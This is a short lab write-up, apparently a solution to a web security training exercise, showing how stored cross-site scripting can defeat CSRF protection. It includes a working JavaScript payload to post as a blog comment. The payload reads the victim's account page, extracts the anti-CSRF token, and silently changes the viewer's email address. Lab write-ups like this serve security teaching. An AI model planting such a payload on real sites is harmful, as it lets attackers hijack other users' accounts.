![image](https://github.com/udayk01/Web-Security/assets/52235763/13bdf5cb-0845-43bd-b3f4-5054aa3e3e28)

## Solution:

> Log in using the credentials provided. On your user account page, notice the function for updating your email address.

![image](https://github.com/udayk01/Web-Security/assets/52235763/b447f65d-1b03-46ab-929f-bc3f093b1591)

> If you view the source for the page, you'll see the following information:

>> You need to issue a POST request to /my-account/change-email, with a parameter called email.

>> There's an anti-CSRF token in a hidden input called token.

> This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address.

![image](https://github.com/udayk01/Web-Security/assets/52235763/f3e8ba3c-26e0-4b4e-8610-40cfdf074af2)

> Submit the following payload in a blog comment:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

![image](https://github.com/udayk01/Web-Security/assets/52235763/c3dd427c-b744-4649-8df6-75f012656bba)

> This will make anyone who views the comment issue a POST request to change their email address to test@test.com.

> Lab Solved

![image](https://github.com/udayk01/Web-Security/assets/52235763/a740953c-e1d2-4671-9e21-9366bda56b98)
